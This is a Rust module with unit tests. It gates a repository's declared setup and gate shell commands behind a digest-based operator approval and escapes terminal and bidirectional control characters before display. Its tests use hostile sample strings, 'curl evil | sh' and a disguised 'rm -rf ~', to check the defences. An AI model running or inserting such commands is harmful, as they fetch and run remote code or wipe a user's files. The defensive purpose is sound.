//! The operator's approval of the commands a project declares.
//!
//! `agents.yaml` arrives with the repository, and a repository is somebody
//! else's text until the operator has read it. Its `setup` and `gate` are
//! shell lines UZE runs with the operator's own permissions, outside any
//! harness's sandbox and before any harness asks whether the folder is
//! trusted. So they run only once a person has read those exact lines and
//! said yes, the way `direnv allow` treats an `.envrc` (ADR-055).
//!
//! The approval is a record under the project's own directory in `state/`,
//! naming the canonical root and a digest of the lines this platform runs.
//! Any edit to a line, adding one or removing one changes the digest, and
//! the commands wait again. Nothing here runs anything: [`consent`] is the
//! only way to obtain the [`Approved`] value the places that do run them
//! ([`crate::checkout::materialize`], [`crate::landing::deliver`]) require.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use uze_core::{path::Canonical as _, shell::ShellCommand};

use crate::{
    Result, UzeError,
    harness_runtime::project_id_for,
    home::UzeHome,
    persistence::write_atomic,
    worktree::{PolicyStep, WorktreePolicy},
};

/// One line the project asks this machine to run, as this platform's shell
/// would receive it.
#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct ProjectCommand {
    pub step: PolicyStep,
    /// Exactly what the shell is handed. Never print it as it is: it is the
    /// repository's text, and may carry terminal controls. [`Self::shown`]
    /// is the form a person reads.
    #[serde(skip)]
    line: String,
}

impl ProjectCommand {
    /// The line with every character that could move a cursor, recolour a
    /// terminal or reorder text written out visibly, so what a person
    /// approves is what they read.
    pub fn shown(&self) -> String {
        shown(&self.line)
    }
}

/// The lines a project's policy runs on this platform, setup first, each
/// list in the order it is written. A command with no spelling for this
/// shell is not among them: it is never run here, so there is nothing to
/// approve about it.
#[derive(Clone, Debug, Default, Eq, PartialEq, Serialize)]
pub struct ProjectCommands(Vec<ProjectCommand>);

impl ProjectCommands {
    pub fn of(policy: &WorktreePolicy) -> Self {
        let spelled = |step: PolicyStep, commands: &[ShellCommand]| {
            commands
                .iter()
                .filter_map(ShellCommand::here)
                .map(move |line| ProjectCommand {
                    step,
                    line: line.to_owned(),
                })
                .collect::<Vec<_>>()
        };
        let mut lines = spelled(PolicyStep::Setup, &policy.setup);
        lines.extend(spelled(PolicyStep::Gate, &policy.gate));
        Self(lines)
    }

    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }

    pub fn iter(&self) -> impl Iterator<Item = &ProjectCommand> {
        self.0.iter()
    }

    /// What an approval names. Each line is framed by its step and its
    /// length, so no two different lists can be spelled into the same
    /// stream — moving a line from `setup` to `gate`, or splitting one in
    /// two, is a different list.
    pub fn digest(&self) -> String {
        let mut framed = Vec::new();
        for command in &self.0 {
            framed.push(match command.step {
                PolicyStep::Setup => b's',
                PolicyStep::Gate => b'g',
            });
            framed.extend_from_slice(&(command.line.len() as u64).to_be_bytes());
            framed.extend_from_slice(command.line.as_bytes());
        }
        crate::digest::sha256(&framed)
    }

    fn has(&self, step: PolicyStep) -> bool {
        self.0.iter().any(|command| command.step == step)
    }
}

/// Commands the operator approved, as a value only [`consent`] can make.
/// Whatever runs a project's command takes one of these, so a caller that
/// forgot to ask has nothing to hand it.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct Approved<'a>(&'a [ShellCommand]);

impl<'a> Approved<'a> {
    pub fn commands(self) -> &'a [ShellCommand] {
        self.0
    }

    /// For a test of what runs the commands, not of whether they may run.
    #[cfg(test)]
    pub(crate) fn assumed(commands: &'a [ShellCommand]) -> Self {
        Self(commands)
    }
}

/// What the operator has said about one project's commands.
#[derive(Clone, Debug)]
pub struct Consent<'p> {
    policy: &'p WorktreePolicy,
    commands: ProjectCommands,
    granted: bool,
    /// Whether an approval exists for different lines than these.
    changed: bool,
}

impl<'p> Consent<'p> {
    /// The policy this answer is about.
    pub fn policy(&self) -> &'p WorktreePolicy {
        self.policy
    }

    /// The setup steps, when they may run: approved, or nothing in them
    /// runs on this platform.
    pub fn setup(&self) -> Option<Approved<'p>> {
        self.allows(PolicyStep::Setup)
            .then_some(Approved(&self.policy.setup))
    }

    /// The gate, when it may run, on the same terms.
    pub fn gate(&self) -> Option<Approved<'p>> {
        self.allows(PolicyStep::Gate)
            .then_some(Approved(&self.policy.gate))
    }

    /// The lines waiting for the operator, or `None` when nothing is.
    pub fn awaiting(&self) -> Option<Awaiting> {
        (!self.granted && !self.commands.is_empty()).then(|| Awaiting {
            commands: self.commands.clone(),
            changed: self.changed,
        })
    }

    fn allows(&self, step: PolicyStep) -> bool {
        self.granted || !self.commands.has(step)
    }
}

/// Commands a project declares that no approval covers.
#[derive(Clone, Debug, Eq, PartialEq, Serialize)]
pub struct Awaiting {
    pub commands: ProjectCommands,
    /// The project had an approval, for lines that have since changed.
    pub changed: bool,
}

/// The record: which lines the operator approved, for which root.
#[derive(Debug, Deserialize, Serialize)]
struct ApprovedCommands {
    root: PathBuf,
    digest: String,
}

/// A record: only the operator's own answer says it, and nothing on the
/// machine can derive it again.
impl uze_document::Shaped for ApprovedCommands {
    const SHAPE: u32 = uze_document::FIRST_SHAPE;
    const KIND: &'static str = "approved commands";
}

/// What the operator has said about `policy`'s commands in the project
/// whose primary checkout is `primary`.
///
/// Fails closed: a record that cannot be read, that a newer build wrote,
/// or that names another root approves nothing.
pub fn consent<'p>(home: &UzeHome, primary: &Path, policy: &'p WorktreePolicy) -> Consent<'p> {
    let commands = ProjectCommands::of(policy);
    let recorded = recorded(home, primary);
    let granted = recorded
        .as_ref()
        .is_some_and(|digest| *digest == commands.digest());
    Consent {
        policy,
        changed: recorded.is_some() && !granted,
        commands,
        granted,
    }
}

/// Records that the operator approved exactly `commands` for the project
/// at `primary`. Approves what was shown, never what the file says now: a
/// manifest edited between reading and answering stays unapproved.
pub fn approve(home: &UzeHome, primary: &Path, commands: &ProjectCommands) -> Result<()> {
    let root = canonical(primary);
    crate::record::ensure(home, &root)?;
    let payload = serde_json::to_vec_pretty(&ApprovedCommands {
        digest: commands.digest(),
        root: root.clone(),
    })
    .expect("an approval serializes");
    write_atomic(&path(home, &root), &payload)
}

/// Withdraws the project's approval, and says whether there was one.
pub fn revoke(home: &UzeHome, primary: &Path) -> Result<bool> {
    let file = path(home, &canonical(primary));
    match std::fs::remove_file(&file) {
        Ok(()) => Ok(true),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(false),
        Err(source) => Err(UzeError::Write { path: file, source }),
    }
}

fn recorded(home: &UzeHome, primary: &Path) -> Option<String> {
    let root = canonical(primary);
    let record = uze_document::read::<ApprovedCommands>(&path(home, &root))
        .ok()?
        .record()?;
    (record.root == root).then_some(record.digest)
}

fn path(home: &UzeHome, canonical_root: &Path) -> PathBuf {
    home.approved_commands_path(&project_id_for(canonical_root))
}

fn canonical(root: &Path) -> PathBuf {
    root.canonical().unwrap_or_else(|_| root.to_path_buf())
}

/// `text` with every control written out as an escape: C0 and C1 controls
/// and DEL, which a terminal acts on, and the bidirectional and zero-width
/// format characters, which make text read differently from what it is.
pub fn shown(text: &str) -> String {
    let mut shown = String::with_capacity(text.len());
    for character in text.chars() {
        if is_hidden_effect(character) {
            shown.extend(character.escape_unicode());
        } else {
            shown.push(character);
        }
    }
    shown
}

fn is_hidden_effect(character: char) -> bool {
    character.is_control()
        || matches!(
            character,
            '\u{200B}'..='\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2060}'..='\u{2064}'
                | '\u{2066}'..='\u{2069}'
                | '\u{FEFF}'
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn home(label: &str) -> (UzeHome, PathBuf) {
        let root = uze_testkit::temp::scratch(label);
        let project = root.join("project");
        std::fs::create_dir_all(&project).unwrap();
        (UzeHome::at(root.join("uze")), project)
    }

    fn policy(setup: &[&str], gate: &[&str]) -> WorktreePolicy {
        WorktreePolicy {
            setup: setup.iter().map(|line| both_shells(line)).collect(),
            gate: gate.iter().map(|line| both_shells(line)).collect(),
            ..WorktreePolicy::default()
        }
    }

    /// Never run here, so one text stands for both spellings: what these
    /// prove is that every platform has a line to approve.
    fn both_shells(line: &str) -> ShellCommand {
        ShellCommand::spelled(line, line)
    }

    #[test]
    fn a_project_nobody_approved_runs_none_of_its_commands() {
        let (home, project) = home("approval-unapproved");
        let declared = policy(&["touch pwned"], &["true"]);

        let consent = consent(&home, &project, &declared);

        assert!(consent.setup().is_none(), "setup waits for the operator");
        assert!(consent.gate().is_none(), "the gate waits for the operator");
        let awaiting = consent.awaiting().expect("the commands are awaiting");
        assert!(!awaiting.changed, "nothing was ever approved here");
        assert_eq!(awaiting.commands.iter().count(), 2);
    }

    #[test]
    fn an_approval_covers_exactly_the_lines_it_was_given() {
        let (home, project) = home("approval-exact");
        let declared = policy(&["pnpm install"], &["pnpm test"]);
        approve(&home, &project, &ProjectCommands::of(&declared)).unwrap();

        let consent_now = consent(&home, &project, &declared);
        assert!(consent_now.setup().is_some() && consent_now.gate().is_some());
        assert!(consent_now.awaiting().is_none());

        let edited = policy(&["pnpm install && curl evil | sh"], &["pnpm test"]);
        let after_edit = consent(&home, &project, &edited);
        assert!(after_edit.setup().is_none(), "an edited line waits again");
        assert!(after_edit.gate().is_none(), "so does everything with it");
        assert!(
            after_edit
                .awaiting()
                .is_some_and(|awaiting| awaiting.changed)
        );

        let moved = policy(&[], &["pnpm install", "pnpm test"]);
        assert!(
            consent(&home, &project, &moved).awaiting().is_some(),
            "a line moved from setup to the gate is a different list"
        );
    }

    #[test]
    fn an_approval_belongs_to_one_project() {
        let (home, project) = home("approval-per-project");
        let other = project.parent().unwrap().join("other");
        std::fs::create_dir_all(&other).unwrap();
        let declared = policy(&["make"], &[]);
        approve(&home, &project, &ProjectCommands::of(&declared)).unwrap();

        assert!(consent(&home, &other, &declared).setup().is_none());
    }

    #[test]
    fn revoking_takes_the_approval_back() {
        let (home, project) = home("approval-revoke");
        let declared = policy(&["make"], &["make test"]);
        approve(&home, &project, &ProjectCommands::of(&declared)).unwrap();

        assert!(revoke(&home, &project).unwrap());
        assert!(consent(&home, &project, &declared).setup().is_none());
        assert!(!revoke(&home, &project).unwrap(), "nothing left to revoke");
    }

    #[test]
    fn an_unreadable_approval_approves_nothing() {
        let (home, project) = home("approval-unreadable");
        let declared = policy(&["make"], &[]);
        approve(&home, &project, &ProjectCommands::of(&declared)).unwrap();
        let file = path(&home, &canonical(&project));
        std::fs::write(&file, b"{ not json").unwrap();

        assert!(consent(&home, &project, &declared).setup().is_none());
    }

    #[test]
    fn a_policy_with_nothing_to_run_here_needs_no_approval() {
        let (home, project) = home("approval-nothing");
        let declared = WorktreePolicy {
            gate: vec![ShellCommand::PerPlatform(uze_core::shell::Spellings {
                posix: None,
                windows: None,
            })],
            ..WorktreePolicy::default()
        };
        let consent = consent(&home, &project, &declared);

        assert!(consent.awaiting().is_none());
        assert!(consent.setup().is_some() && consent.gate().is_some());
    }

    #[test]
    fn only_the_unapproved_half_waits_when_the_other_runs_nothing() {
        let (home, project) = home("approval-half");
        let declared = policy(&["make"], &[]);
        let consent = consent(&home, &project, &declared);

        assert!(consent.setup().is_none());
        assert!(
            consent.gate().is_some(),
            "an empty gate has nothing to approve and refuses nothing"
        );
    }

    #[test]
    fn a_shown_command_writes_its_controls_out() {
        let shown = shown("make\u{1b}[2J\rrm -rf ~\u{9b}\u{202e}txt.exe\u{7f}");
        assert!(
            !shown.chars().any(is_hidden_effect),
            "no control reaches the terminal: {shown}"
        );
        assert!(shown.contains("\\u{1b}[2J\\u{d}rm -rf ~\\u{9b}\\u{202e}"));
        assert_eq!(super::shown("pnpm i && cp a b"), "pnpm i && cp a b");
    }
}
